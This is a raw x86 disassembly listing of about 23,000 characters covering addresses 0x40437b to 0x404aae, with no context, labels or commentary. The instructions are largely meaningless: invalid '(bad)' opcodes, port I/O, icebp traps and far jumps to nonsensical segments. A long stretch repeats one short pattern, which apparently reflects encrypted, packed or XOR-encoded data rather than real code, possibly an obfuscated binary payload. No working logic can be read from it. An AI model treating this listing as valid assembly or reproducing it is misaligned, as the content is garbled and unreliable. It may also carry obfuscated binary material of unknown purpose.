  40437b:	clc    
  40437c:	jecxz  0x4043e4
  40437e:	push   es
  40437f:	std    
  404380:	add    eax,0x23f3dd10
  404385:	adc    esi,ebx
  404387:	outs   dx,BYTE PTR ds:[esi]
  404388:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404389:	fidivr DWORD PTR [ebp-0x56]
  40438c:	loopne 0x404359
  40438e:	mov    eax,ds:0xc0bc8435
  404393:	xchg   ecx,eax
  404394:	scas   eax,DWORD PTR es:[edi]
  404395:	data16 jl 0x404334
  404398:	(bad)  
  404399:	fisttp WORD PTR [ebx+0x63ed5420]
  40439f:	std    
  4043a0:	lods   al,BYTE PTR ds:[esi]
  4043a1:	shl    BYTE PTR [esi+0x19],cl
  4043a4:	and    dl,BYTE PTR [ebx]
  4043a6:	ret    0x39ae
  4043a9:	fsubr  DWORD PTR [eax-0x3deea08c]
  4043af:	scas   al,BYTE PTR es:[edi]
  4043b0:	repz inc ebp
  4043b2:	push   edi
  4043b3:	sti    
  4043b4:	fadd   st(3),st
  4043b6:	retf   
  4043b7:	outs   dx,BYTE PTR ds:[esi]
  4043b8:	cmc    
  4043b9:	add    BYTE PTR [eax+esi*8+0x1b4f1323],ch
  4043c0:	xacquire xchg BYTE PTR [ebx],ah
  4043c3:	icebp  
  4043c4:	(bad)  
  4043c5:	sbb    eax,DWORD PTR [edx]
  4043c7:	(bad)  
  4043c9:	retf   
  4043ca:	jne    0x4043da
  4043cc:	mov    dh,0x6b
  4043ce:	shr    BYTE PTR [esi-0x11c7306],0xa6
  4043d5:	addr16 ret 
  4043d7:	scas   al,BYTE PTR es:[edi]
  4043d8:	cli    
  4043d9:	sub    DWORD PTR [ebx],ebp
  4043db:	xor    DWORD PTR [esi-0x18],edx
  4043de:	sub    DWORD PTR [edx+0x12],ecx
  4043e1:	mov    ch,0xdc
  4043e3:	push   cs
  4043e4:	fcomp  QWORD PTR [edx]
  4043e6:	add    ah,BYTE PTR [ecx-0xedd1a81]
  4043ec:	and    ebx,DWORD PTR [esi-0x7a0621b9]
  4043f2:	and    esp,DWORD PTR [ecx-0x53697924]
  4043f8:	cli    
  4043f9:	test   DWORD PTR [esi-0x3def5584],ebp
  4043ff:	scas   al,BYTE PTR es:[edi]
  404400:	stos   DWORD PTR es:[edi],eax
  404401:	aad    0xdc
  404403:	fs jae 0x404417
  404406:	ret    0x73ae
  404409:	add    BYTE PTR [edi+0x4f1323f3],ah
  40440f:	sub    eax,DWORD PTR [esi+0x73f12386]
  404415:	in     al,dx
  404416:	push   edi
  404417:	cli    
  404418:	clc    
  404419:	test   DWORD PTR [ebx],esp
  40441b:	bound  ebp,QWORD PTR [esi-0x552af6a]
  404421:	test   DWORD PTR [ebx-0x5e],esi
  404424:	fadd   QWORD PTR [esi-0x7a05536e]
  40442a:	stos   BYTE PTR es:[edi],al
  40442b:	je     0x4043d8
  40442d:	adc    edx,eax
  40442f:	scas   al,BYTE PTR es:[edi]
  404430:	ja     0x404432
  404432:	xor    edx,0x23
  404435:	adc    edx,DWORD PTR [edx+0x731005fd]
  40443b:	repz and edx,DWORD PTR [ebx]
  40443e:	dec    ebx
  40443f:	sub    esi,DWORD PTR [esi-0x79]
  404442:	and    esi,ecx
  404444:	scas   al,BYTE PTR es:[edi]
  404445:	xchg   esi,eax
  404446:	jae    0x4043f5
  404448:	cli    
  404449:	test   DWORD PTR [ebx-0x5e],esi
  40444c:	fadd   QWORD PTR [esi-0x7a05536e]
  404452:	stos   BYTE PTR es:[edi],al
  404453:	je     0x404408
  404455:	adc    edx,eax
  404457:	scas   al,BYTE PTR es:[edi]
  404458:	stos   BYTE PTR es:[edi],al
  404459:	ror    DWORD PTR [ebx-0x18],1
  40445c:	and    edx,DWORD PTR [ecx]
  40445e:	ret    0xfac4
  404461:	or     BYTE PTR [esi-0x3decdfb4],ah
  404467:	(bad)  
  404468:	xchg   edx,eax
  404469:	xchg   DWORD PTR [ebx],esp
  40446b:	icebp  
  40446c:	mov    ds:0xf82657ec,eax
  404471:	test   DWORD PTR [ebx],esp
  404473:	stos   BYTE PTR es:[edi],al
  404474:	sub    dl,bl
  404476:	mov    bh,0xf8
  404478:	ja     0x40447a
  40447a:	mul    BYTE PTR gs:[ebx]
  40447d:	adc    edx,DWORD PTR [edx+0x26c37f23]
  404483:	icebp  
  404484:	and    eax,DWORD PTR [ebx-0x58]
  404487:	scas   al,BYTE PTR es:[edi]
  404488:	nop
  404489:	test   DWORD PTR [esi-0x3de8d38c],ebp
  40448f:	scas   al,BYTE PTR es:[edi]
  404490:	stos   BYTE PTR es:[edi],al
  404491:	(bad)  
  404492:	fsub   QWORD PTR [edi+ebp*4+0x11]
  404496:	ret    0xaaae
  404499:	(bad)  
  40449a:	fsub   QWORD PTR [ebx+esi*4+0x11]
  40449e:	ret    0xa2ae
  4044a1:	mov    ebx,fs
  4044a3:	test   BYTE PTR [edx],cl
  4044a5:	sahf   
  4044a6:	ja     0x4044a0
  4044a8:	stc    
  4044a9:	test   DWORD PTR [ebx],esp
  4044ab:	pop    ebp
  4044ac:	sub    edx,ebx
  4044ae:	mov    dh,0xb0
  4044b0:	mov    ah,0xd3
  4044b2:	scas   al,BYTE PTR es:[edi]
  4044b3:	je     0x40451a
  4044b5:	push   ss
  4044b6:	ret    0xaaae
  4044b9:	jp     0x404471
  4044bb:	jne    0x4044de
  4044bd:	adc    eax,edx
  4044bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044c0:	cmp    cl,BYTE PTR [edx+0x132377a6]
  4044c6:	ret    0xf202
  4044c9:	inc    ebp
  4044ca:	push   esi
  4044cb:	or     cl,al
  4044cd:	into   
  4044ce:	xchg   edx,eax
  4044cf:	cli    
  4044d0:	xchg   edx,eax
  4044d1:	pushf  
  4044d2:	and    esi,ebx
  4044d4:	and    edi,DWORD PTR [ecx-0x3e]
  4044d7:	and    edi,DWORD PTR [edi+0x60]
  4044da:	and    cl,dh
  4044dc:	and    eax,DWORD PTR [ebx-0x56]
  4044df:	lods   al,BYTE PTR ds:[esi]
  4044e0:	cli    
  4044e1:	test   DWORD PTR [ebx-0x3f6449f2],esp
  4044e7:	scas   al,BYTE PTR es:[edi]
  4044e8:	cli    
  4044e9:	fisubr WORD PTR [edx]
  4044eb:	xor    DWORD PTR [esi+0x4e],edx
  4044ee:	dec    edi
  4044ef:	sub    edi,DWORD PTR [edx+eax*4+0x13e4f123]
  4044f6:	ret    0xfaac
  4044f9:	test   DWORD PTR [ebx+0x7c],esi
  4044fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044fd:	push   ebp
  4044fe:	(bad)  
  4044ff:	scas   al,BYTE PTR es:[edi]
  404500:	cli    
  404501:	aad    0x49
  404503:	icebp  
  404504:	dec    ecx
  404505:	adc    ecx,DWORD PTR [edi+0x2b]
  404508:	jmp    0x40448b
  40450a:	and    esi,ecx
  40450c:	jae    0x40454e
  40450e:	cmp    eax,0x2387763b
  404513:	icebp  
  404514:	jae    0x404556
  404516:	cmp    eax,0x23876a3b
  40451b:	icebp  
  40451c:	jnp    0x404538
  40451e:	add    bl,bl
  404520:	ror    BYTE PTR [eax],1
  404522:	xchg   esi,eax
  404523:	mov    bh,0x26
  404525:	adc    eax,edx
  404527:	lahf   
  404528:	xor    esi,DWORD PTR [ebx+eiz*8-0x492cd4a3]
  40452f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404530:	cmp    eax,DWORD PTR [esp+0x72]
  404534:	sar    DWORD PTR [ecx],cl
  404536:	ret    
  404537:	outs   dx,DWORD PTR ds:[esi]
  404538:	adc    DWORD PTR [esi+ebp*4+0x44],esi
  40453c:	fist   WORD PTR [ecx]
  40453e:	ret    0x57ae
  404541:	mov    ebx,fs
  404543:	test   DWORD PTR ds:0xddb032a,esp
  404549:	outs   dx,BYTE PTR ds:[esi]
  40454a:	and    DWORD PTR [edx],ebx
  40454c:	sub    edi,DWORD PTR [ecx-0x3e]
  40454f:	push   ecx
  404550:	outs   dx,DWORD PTR ds:[esi]
  404551:	frstor [ecx]
  404553:	icebp  
  404554:	and    ecx,DWORD PTR [esi-0x63]
  404557:	lock mov eax,ds:0xff0afa46
  40455d:	xchg   esi,eax
  40455e:	aam    0x34
  404560:	mov    ch,0x72
  404562:	push   ds
  404563:	jle    0x40451a
  404565:	mov    cl,0x3e
  404567:	xchg   ebp,eax
  404568:	pop    edx
  404569:	ds jo  0x404513
  40456c:	je     0x4045b4
  40456e:	sub    ch,BYTE PTR [edi+0x322385fa]
  404574:	jle    0x404571
  404576:	mov    edx,0xb07a0555
  40457b:	jl     0x40451b
  40457d:	xchg   esi,eax
  40457e:	ret    0xfaae
  404581:	or     al,0xdd
  404583:	jb     0x40456a
  404585:	push   edi
  404586:	outs   dx,DWORD PTR ds:[esi]
  404587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404588:	cmp    dh,cl
  40458a:	sub    DWORD PTR [ecx+0x54e6fb70],esp
  404590:	add    eax,0xd21a887a
  404595:	jns    0x40455d
  404597:	(bad)  
  404598:	cli    
  404599:	xchg   ebp,eax
  40459a:	and    esi,ecx
  40459c:	scas   al,BYTE PTR es:[edi]
  40459d:	mov    es,WORD PTR [ebx+ebp*4-0x6]
  4045a1:	test   DWORD PTR [ebx-0xf],ecx
  4045a4:	popa   
  4045a5:	adc    dl,al
  4045a7:	(bad)  
  4045a8:	cli    
  4045a9:	jp     0x404561
  4045ab:	pusha  
  4045ac:	and    edx,DWORD PTR [ebx]
  4045ae:	ret    0x3c27
  4045b1:	aad    0x70
  4045b3:	sbb    DWORD PTR [ebx-0x17],ecx
  4045b6:	cmp    eax,0x23854551
  4045bb:	mov    cl,0x23
  4045bd:	inc    ebp
  4045be:	xchg   ebp,eax
  4045bf:	inc    esi
  4045c0:	fidivr WORD PTR [ecx-0x24]
  4045c3:	push   cs
  4045c4:	dec    ebx
  4045c5:	adc    eax,DWORD PTR [edx-0x52]
  4045c8:	cli    
  4045c9:	out    dx,eax
  4045ca:	and    esp,DWORD PTR [edi-0x51a47924]
  4045d0:	cli    
  4045d1:	test   DWORD PTR [ecx+ebx*1-0x52],esi
  4045d5:	out    dx,eax
  4045d6:	cmp    eax,0x8c6dad51
  4045db:	or     bl,ah
  4045dd:	in     al,dx
  4045de:	dec    ebx
  4045df:	push   esi
  4045e0:	stc    
  4045e1:	ret    0x7a1f
  4045e4:	arpl   WORD PTR [ebx],di
  4045e6:	ret    
  4045e7:	push   esi
  4045e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045e9:	fidivr DWORD PTR [ebp-0x56]
  4045ec:	dec    ecx
  4045ed:	adc    edi,DWORD PTR ds:0xdc85907e
  4045f3:	fs scas al,BYTE PTR es:[edi]
  4045f5:	adc    eax,edx
  4045f7:	scas   al,BYTE PTR es:[edi]
  4045f8:	shl    DWORD PTR [esi+0x37],cl
  4045fb:	mov    al,0x3
  4045fd:	test   eax,0x291bec8f
  404602:	aad    0x8d
  404604:	cld    
  404605:	xor    al,0x12
  404607:	mov    BYTE PTR [ebx-0x102535d0],bl
  40460d:	sbb    al,BYTE PTR [ecx-0x2e]
  404610:	cmc    
  404611:	adc    eax,0xda73f024
  404616:	inc    eax
  404617:	mov    ecx,0xfa4d2ac5
  40461c:	aad    0x45
  40461e:	jno    0x4045c1
  404620:	jge    0x4045df
  404622:	xor    DWORD PTR [esi-0x2c00a759],esi
  404628:	mov    ds:0xf9b20a82,al
  40462d:	push   edi
  40462e:	arpl   WORD PTR [edx+esi*4+0x50c08ce7],dx
  404635:	ins    DWORD PTR es:[edi],dx
  404636:	lahf   
  404637:	(bad)  
  404639:	outs   dx,DWORD PTR ds:[esi]
  40463a:	cmp    eax,eax
  40463c:	fisubr WORD PTR [edx+0x61]
  40463f:	xor    ebp,DWORD PTR [esp+ecx*4+0x73]
  404643:	test   eax,0x3233e0a5
  404648:	push   ss
  404649:	in     al,0x83
  40464b:	out    0x75,al
  40464d:	hlt    
  40464e:	pop    esi
  40464f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404650:	mov    bh,0x40
  404652:	jo     0x40460b
  404654:	stos   BYTE PTR es:[edi],al
  404655:	rcr    BYTE PTR [esp+edx*1],0xea
  404659:	rcl    DWORD PTR [edx+0x304caf86],0xcd
  404660:	cmp    al,0x79
  404662:	gs unpckhps xmm2,xmm2
  404666:	sub    BYTE PTR [eax-0x49090e42],ch
  40466c:	mov    WORD PTR [edx-0x7a05c88a],fs
  404672:	and    esi,ecx
  404674:	popa   
  404675:	js     0x404650
  404677:	inc    ecx
  404678:	xor    eax,0x4e7d7a87
  40467d:	xor    al,0xfc
  40467f:	mov    esp,0xa407987f
  404684:	das    
  404685:	sub    esp,ebx
  404687:	test   eax,0xded06cd3
  40468c:	cli    
  40468d:	mov    esi,DWORD PTR [ebp+0x5836351e]
  404693:	(bad)  
  404694:	jp     0x40463a
  404696:	lods   eax,DWORD PTR ds:[esi]
  404697:	or     bh,al
  404699:	stos   BYTE PTR es:[edi],al
  40469a:	push   esp
  40469b:	mov    bh,0xcd
  40469d:	mov    cl,bl
  40469f:	jns    0x40469b
  4046a1:	test   DWORD PTR [ebx],esp
  4046a3:	icebp  
  4046a4:	rcl    esp,0xa9
  4046a7:	mov    eax,ds:0xa6550aca
  4046ac:	and    edx,DWORD PTR [ebx]
  4046ae:	ret    0xa9ae
  4046b1:	out    0x4a,eax
  4046b3:	xchg   esp,eax
  4046b4:	addr16 jg 0x404665
  4046b7:	sbb    BYTE PTR [esi+0x42f14fe9],0x63
  4046be:	stos   DWORD PTR es:[edi],eax
  4046bf:	icebp  
  4046c0:	xchg   esi,eax
  4046c1:	jmp    0xaeae:0x7f47df44
  4046c8:	mov    dh,dh
  4046ca:	push   edi
  4046cb:	sahf   
  4046cc:	push   ecx
  4046cd:	jbe    0x404670
  4046cf:	sbb    BYTE PTR [esi+0x47f14fe9],0x7a
  4046d6:	mov    al,0xf1
  4046d8:	(bad)  
  4046d9:	in     al,0x57
  4046db:	xchg   edx,eax
  4046dc:	dec    ebx
  4046dd:	cmp    eax,0x8596c2a6
  4046e2:	pusha  
  4046e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046e4:	jo     0x404744
  4046e6:	lods   eax,DWORD PTR ds:[esi]
  4046e7:	rcl    BYTE PTR [ebx+0xd834cf1],0x77
  4046ee:	scas   al,BYTE PTR es:[edi]
  4046ef:	ret    0xe1fa
  4046f2:	inc    ecx
  4046f3:	xchg   esi,eax
  4046f4:	dec    ebx
  4046f5:	jbe    0x4046a5
  4046f7:	(bad)  
  4046f9:	loope  0x40474a
  4046fb:	popf   
  4046fc:	and    edx,DWORD PTR [ebx]
  4046fe:	xchg   esp,eax
  4046ff:	out    0xa8,eax
  404701:	shl    DWORD PTR [esi-0x50],1
  404704:	outs   dx,DWORD PTR ds:[esi]
  404705:	adc    edx,DWORD PTR [ebx+eiz*8-0x4b8e3b53]
  40470c:	and    eax,DWORD PTR [ebp-0x80]
  40470f:	loope  0x4046b3
  404711:	test   DWORD PTR [edx-0x4c],esi
  404714:	outs   dx,BYTE PTR ds:[esi]
  404715:	inc    esi
  404716:	ret    0xa9ae
  404719:	in     eax,dx
  40471a:	dec    edi
  40471b:	xchg   BYTE PTR [edx+0x63],al
  40471e:	stos   DWORD PTR es:[edi],eax
  40471f:	sbb    BYTE PTR [esi+0x42f14fe9],0x77
  404726:	mov    ah,0xcf
  404728:	mov    ch,ah
  40472a:	adc    bl,al
  40472c:	or     eax,0xfac2ae77
  404731:	(bad)  
  404732:	push   edi
  404733:	xor    DWORD PTR [eax+0x67],0xffffffb0
  404737:	out    0xbb,eax
  404739:	test   DWORD PTR [ecx-0x6c],esi
  40473c:	inc    esp
  40473d:	pop    esp
  40473e:	mov    dl,0xcb
  404740:	xchg   esp,eax
  404741:	into   
  404742:	inc    esi
  404743:	mov    BYTE PTR [esi+0x6b],ah
  404746:	sub    DWORD PTR [esi-0x5fbb1f58],0x56
  40474d:	jbe    0x4046ff
  40474f:	xlat   BYTE PTR ds:[ebx]
  404750:	lods   al,BYTE PTR ds:[esi]
  404751:	in     al,0x4f
  404753:	test   BYTE PTR [esi+0x56],al
  404756:	mov    edx,0x46d7faef
  40475b:	xchg   esi,eax
  40475c:	pusha  
  40475d:	jg     0x40470c
  40475f:	fstp   QWORD PTR [edi+0x238846ce]
  404765:	inc    eax
  404766:	fwait
  404767:	std    
  404768:	scas   al,BYTE PTR es:[edi]
  404769:	shr    BYTE PTR [esi-0x53],0x60
  40476d:	jl     0x40471b
  40476f:	fimul  DWORD PTR [eax+0x46a24fea]
  404775:	addr16 repnz sahf 
  404778:	retf   
  404779:	fnstenv [eax-0x6c]
  40477c:	push   ecx
  40477d:	gs stos DWORD PTR es:[edi],eax
  40477f:	int    0x9f
  404781:	idiv   BYTE PTR [edi-0x4b]
  404784:	dec    edx
  404785:	pusha  
  404786:	test   eax,0x56ebbff2
  40478b:	pushf  
  40478c:	and    eax,DWORD PTR [eax-0x53]
  40478f:	enter  0xf28e,0x42
  404793:	add    DWORD PTR [esi+0x4f],0xffffff8f
  404797:	(bad)  
  404798:	cdq    
  404799:	test   DWORD PTR [edx+eax*4+0x4c],0xadf2b675
  4047a1:	in     al,dx
  4047a2:	dec    ebp
  4047a3:	xchg   ebp,eax
  4047a4:	dec    esp
  4047a5:	fs mov cl,0xf2
  4047a8:	mov    ecx,0x468351f0
  4047ad:	jge    0x404765
  4047af:	clc    
  4047b0:	lahf   
  4047b1:	not    DWORD PTR [eax-0x68]
  4047b4:	dec    esp
  4047b5:	jge    0x404779
  4047b7:	sahf   
  4047b8:	cli    
  4047b9:	aad    0x51
  4047bb:	sahf   
  4047bc:	inc    edi
  4047bd:	mov    ax,ds:0x23e1b3da
  4047c3:	icebp  
  4047c4:	and    edx,DWORD PTR [ebx]
  4047c6:	ret    0xfaae
  4047c9:	test   DWORD PTR [ebx],esp
  4047cb:	icebp  
  4047cc:	and    edx,DWORD PTR [ebx]
  4047ce:	ret    0xfaae
  4047d1:	test   DWORD PTR [ebx],esp
  4047d3:	icebp  
  4047d4:	and    edx,DWORD PTR [ebx]
  4047d6:	ret    0xfaae
  4047d9:	test   DWORD PTR [ebx],esp
  4047db:	icebp  
  4047dc:	and    edx,DWORD PTR [ebx]
  4047de:	ret    0xfaae
  4047e1:	test   DWORD PTR [ebx],esp
  4047e3:	icebp  
  4047e4:	and    edx,DWORD PTR [ebx]
  4047e6:	ret    0xfaae
  4047e9:	test   DWORD PTR [ebx],esp
  4047eb:	icebp  
  4047ec:	and    edx,DWORD PTR [ebx]
  4047ee:	ret    0xfaae
  4047f1:	test   DWORD PTR [ebx],esp
  4047f3:	icebp  
  4047f4:	and    edx,DWORD PTR [ebx]
  4047f6:	ret    0xfaae
  4047f9:	test   DWORD PTR [ebx],esp
  4047fb:	icebp  
  4047fc:	and    edx,DWORD PTR [ebx]
  4047fe:	ret    0xfaae
  404801:	test   DWORD PTR [ebx],esp
  404803:	icebp  
  404804:	and    edx,DWORD PTR [ebx]
  404806:	ret    0xfaae
  404809:	test   DWORD PTR [ebx],esp
  40480b:	icebp  
  40480c:	and    edx,DWORD PTR [ebx]
  40480e:	ret    0xfaae
  404811:	test   DWORD PTR [ebx],esp
  404813:	icebp  
  404814:	and    edx,DWORD PTR [ebx]
  404816:	ret    0xfaae
  404819:	test   DWORD PTR [ebx],esp
  40481b:	icebp  
  40481c:	and    edx,DWORD PTR [ebx]
  40481e:	ret    0xfaae
  404821:	test   DWORD PTR [ebx],esp
  404823:	icebp  
  404824:	and    edx,DWORD PTR [ebx]
  404826:	ret    0xfaae
  404829:	test   DWORD PTR [ebx],esp
  40482b:	icebp  
  40482c:	and    edx,DWORD PTR [ebx]
  40482e:	ret    0xfaae
  404831:	test   DWORD PTR [ebx],esp
  404833:	icebp  
  404834:	and    edx,DWORD PTR [ebx]
  404836:	ret    0xfaae
  404839:	test   DWORD PTR [ebx],esp
  40483b:	icebp  
  40483c:	and    edx,DWORD PTR [ebx]
  40483e:	ret    0xfaae
  404841:	test   DWORD PTR [ebx],esp
  404843:	icebp  
  404844:	and    edx,DWORD PTR [ebx]
  404846:	ret    0xfaae
  404849:	test   DWORD PTR [ebx],esp
  40484b:	icebp  
  40484c:	and    edx,DWORD PTR [ebx]
  40484e:	ret    0xfaae
  404851:	test   DWORD PTR [ebx],esp
  404853:	icebp  
  404854:	and    edx,DWORD PTR [ebx]
  404856:	ret    0xfaae
  404859:	test   DWORD PTR [ebx],esp
  40485b:	icebp  
  40485c:	and    edx,DWORD PTR [ebx]
  40485e:	ret    0xfaae
  404861:	test   DWORD PTR [ebx],esp
  404863:	icebp  
  404864:	and    edx,DWORD PTR [ebx]
  404866:	ret    0xfaae
  404869:	test   DWORD PTR [ebx],esp
  40486b:	icebp  
  40486c:	and    edx,DWORD PTR [ebx]
  40486e:	ret    0xfaae
  404871:	test   DWORD PTR [ebx],esp
  404873:	icebp  
  404874:	and    edx,DWORD PTR [ebx]
  404876:	ret    0xfaae
  404879:	test   DWORD PTR [ebx],esp
  40487b:	icebp  
  40487c:	and    edx,DWORD PTR [ebx]
  40487e:	ret    0xfaae
  404881:	test   DWORD PTR [ebx],esp
  404883:	icebp  
  404884:	and    edx,DWORD PTR [ebx]
  404886:	ret    0xfaae
  404889:	test   DWORD PTR [ebx],esp
  40488b:	icebp  
  40488c:	and    edx,DWORD PTR [ebx]
  40488e:	ret    0xfaae
  404891:	test   DWORD PTR [ebx],esp
  404893:	icebp  
  404894:	and    edx,DWORD PTR [ebx]
  404896:	ret    0xfaae
  404899:	test   DWORD PTR [ebx],esp
  40489b:	icebp  
  40489c:	and    edx,DWORD PTR [ebx]
  40489e:	ret    0xfaae
  4048a1:	test   DWORD PTR [ebx],esp
  4048a3:	icebp  
  4048a4:	and    edx,DWORD PTR [ebx]
  4048a6:	ret    0xfaae
  4048a9:	test   DWORD PTR [ebx],esp
  4048ab:	icebp  
  4048ac:	and    edx,DWORD PTR [ebx]
  4048ae:	ret    0xfaae
  4048b1:	test   DWORD PTR [ebx],esp
  4048b3:	icebp  
  4048b4:	and    edx,DWORD PTR [ebx]
  4048b6:	ret    0xfaae
  4048b9:	test   DWORD PTR [ebx],esp
  4048bb:	icebp  
  4048bc:	and    edx,DWORD PTR [ebx]
  4048be:	ret    0xfaae
  4048c1:	test   DWORD PTR [ebx],esp
  4048c3:	icebp  
  4048c4:	and    edx,DWORD PTR [ebx]
  4048c6:	ret    0xfaae
  4048c9:	test   DWORD PTR [ebx],esp
  4048cb:	icebp  
  4048cc:	and    edx,DWORD PTR [ebx]
  4048ce:	ret    0xfaae
  4048d1:	test   DWORD PTR [ebx],esp
  4048d3:	icebp  
  4048d4:	and    edx,DWORD PTR [ebx]
  4048d6:	ret    0xfaae
  4048d9:	test   DWORD PTR [ebx],esp
  4048db:	icebp  
  4048dc:	and    edx,DWORD PTR [ebx]
  4048de:	ret    0xfaae
  4048e1:	test   DWORD PTR [ebx],esp
  4048e3:	icebp  
  4048e4:	and    edx,DWORD PTR [ebx]
  4048e6:	ret    0xfaae
  4048e9:	test   DWORD PTR [ebx],esp
  4048eb:	icebp  
  4048ec:	and    edx,DWORD PTR [ebx]
  4048ee:	rcl    BYTE PTR [ecx+0x2806c6e9],1
  4048f4:	mov    dl,0x37
  4048f6:	es mov al,0xbd
  4048f9:	out    0x84,al
  4048fb:	int3   
  4048fc:	push   ds
  4048fd:	inc    ecx
  4048fe:	frstor [edi+0x60]
  404901:	mov    bh,0xe
  404903:	(bad)  [ecx]
  404905:	inc    ebx
  404906:	stos   BYTE PTR es:[edi],al
  404907:	leave  
  404908:	and    dh,cl
  40490a:	pushf  
  40490b:	repnz cwde 
  40490d:	jl     0x404934
  40490f:	xchg   DWORD PTR [ecx],ecx
  404911:	fild   DWORD PTR [edi-0x24]
  404914:	addr16 cmp eax,0xfbfab934
  40491a:	cmp    DWORD PTR [ecx-0x7effd4fa],ebp
  404920:	inc    ecx
  404921:	sahf   
  404922:	in     al,0x86
  404924:	pop    ds
  404925:	or     eax,0x96211791
  40492a:	ja     0x40491f
  40492c:	inc    edi
  40492d:	sub    eax,0x922e560e
  404932:	outs   dx,BYTE PTR ds:[esi]
  404933:	aam    0x39
  404935:	or     al,0xec
  404937:	pop    esp
  404938:	jl     0x404922
  40493a:	or     al,0x13
  40493c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40493d:	and    eax,0x8a3e3962
  404942:	push   ebp
  404943:	pusha  
  404944:	popf   
  404945:	and    BYTE PTR [esi+0x5a],al
  404948:	lds    esp,FWORD PTR [ecx+0x71ede990]
  40494e:	mov    al,0x6c
  404950:	dec    ebp
  404951:	int    0x89
  404953:	push   ds
  404954:	sbb    eax,0x1220970b
  404959:	into   
  40495a:	inc    ecx
  40495b:	fs sti 
  40495d:	add    edx,DWORD PTR [ebx-0xd]
  404960:	int    0xfe
  404962:	jmp    0x47ba:0x427cc3e8
  404969:	in     al,0x82
  40496b:	loopne 0x40491b
  40496d:	push   edi
  40496e:	repnz sub bh,BYTE PTR [edx-0x74]
  404972:	or     al,0x81
  404974:	inc    ebp
  404975:	inc    edi
  404976:	xor    esi,esp
  404978:	mov    ch,0x94
  40497a:	inc    esi
  40497b:	mov    ds:0x32a57f1d,eax
  404980:	imul   ebp,edx,0x57229648
  404986:	ins    BYTE PTR es:[edi],dx
  404987:	push   0xffffffd6
  404989:	mov    ebp,0x10076971
  40498e:	fcomp  DWORD PTR [edi+0x3ffed276]
  404994:	enter  0x8d27,0x84
  404998:	mov    al,ds:0xac2da6e0
  40499d:	adc    ecx,edx
  40499f:	cvttps2pi mm6,QWORD PTR [edi+0x3bcaf15b]
  4049a6:	xor    DWORD PTR [ebp-0x19],0x5c849dc
  4049ad:	and    al,0xad
  4049af:	aam    0x79
  4049b1:	stos   DWORD PTR es:[edi],eax
  4049b2:	addr16 aam 0xf8
  4049b5:	sub    cl,dl
  4049b7:	pop    ds
  4049b8:	xchg   ecx,eax
  4049b9:	out    0x90,eax
  4049bb:	inc    edi
  4049bc:	adc    BYTE PTR [edi],bl
  4049be:	lds    eax,FWORD PTR [esi]
  4049c0:	in     eax,0x92
  4049c2:	dec    esi
  4049c3:	sahf   
  4049c4:	jae    0x4049d2
  4049c6:	call   0x541c838e
  4049cb:	call   DWORD PTR [edi]
  4049cd:	ds std 
  4049cf:	pop    esp
  4049d0:	gs mov cl,0x35
  4049d3:	sar    dl,1
  4049d5:	arpl   cx,di
  4049d7:	retf   
  4049d8:	icebp  
  4049d9:	mov    edx,0x1600d5f0
  4049de:	test   DWORD PTR ds:0x877fc3bc,esi
  4049e4:	pop    edi
  4049e5:	push   esi
  4049e6:	gs sbb eax,esp
  4049e9:	jmp    0x404a4a
  4049eb:	out    dx,al
  4049ec:	sub    eax,DWORD PTR [ebp+eax*2-0x64]
  4049f0:	mov    cl,0xd3
  4049f2:	jo     0x40498c
  4049f4:	shl    DWORD PTR [ecx-0x1f],0xab
  4049f8:	jne    0x40497e
  4049fa:	or     ah,0xb9
  4049fd:	inc    edi
  4049fe:	test   eax,0x3adfbeee
  404a03:	scas   al,BYTE PTR es:[edi]
  404a04:	ret    0xb725
  404a07:	rcl    al,1
  404a09:	sbb    DWORD PTR [edi-0x39],0xfffffff7
  404a0d:	pop    esp
  404a0e:	pop    ss
  404a0f:	cmp    DWORD PTR [edi+0x64743af0],0x899be902
  404a19:	jmp    0x4049ab
  404a1b:	and    eax,DWORD PTR [esi+ebx*2-0x3eff5ca5]
  404a22:	or     al,0x2a
  404a24:	mov    cl,0x6f
  404a26:	dec    esp
  404a27:	test   BYTE PTR [esi-0x49d95478],cl
  404a2d:	push   esi
  404a2e:	stos   BYTE PTR es:[edi],al
  404a2f:	jmp    0x4049b4
  404a31:	cmc    
  404a32:	stos   DWORD PTR es:[edi],eax
  404a33:	sbb    DWORD PTR [eax+0x65e0dd3a],ebx
  404a39:	jmp    0xe26d:0x50e1ff5a
  404a40:	mov    esi,0x254278fc
  404a45:	pusha  
  404a46:	sahf   
  404a47:	clc    
  404a48:	adc    edi,DWORD PTR [ecx+0x68072062]
  404a4e:	push   edx
  404a4f:	out    dx,eax
  404a50:	fsubr  QWORD PTR [ebx+0x42b99db8]
  404a56:	xor    eax,0x1cf4aaf3
  404a5b:	int3   
  404a5c:	push   0x40
  404a5e:	adc    dh,BYTE PTR [ebx-0x741f1752]
  404a64:	push   edx
  404a65:	ds inc ecx
  404a67:	add    eax,ecx
  404a69:	lock mov dl,0xc
  404a6c:	add    DWORD PTR [ecx+0x3a],0xffffffca
  404a70:	popf   
  404a71:	ret    0xb44
  404a74:	ss inc esi
  404a76:	pop    ss
  404a77:	add    eax,0xc9139010
  404a7c:	xchg   esp,eax
  404a7d:	jb     0x404a2b
  404a7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a80:	xor    dh,al
  404a82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a83:	(bad)  
  404a84:	adc    dl,BYTE PTR [esi]
  404a86:	js     0x404ab4
  404a88:	into   
  404a89:	out    0x97,eax
  404a8b:	inc    edx
  404a8c:	push   ecx
  404a8d:	jbe    0x404a45
  404a8f:	mov    WORD PTR [esi-0x5e1bba38],cs
  404a95:	adc    BYTE PTR [ebx+esi*2-0x6c102b50],dl
  404a9c:	sub    bl,BYTE PTR [ecx]
  404a9e:	sti    
  404a9f:	jmp    0x7831:0xc396ebcf
  404aa6:	aas    
  404aa7:	xchg   ecx,eax
  404aa8:	inc    ebp
  404aa9:	repnz push ebp
  404aab:	leave  
  404aac:	and    DWORD PTR [esi],edi
  404aae:	int    0x4c
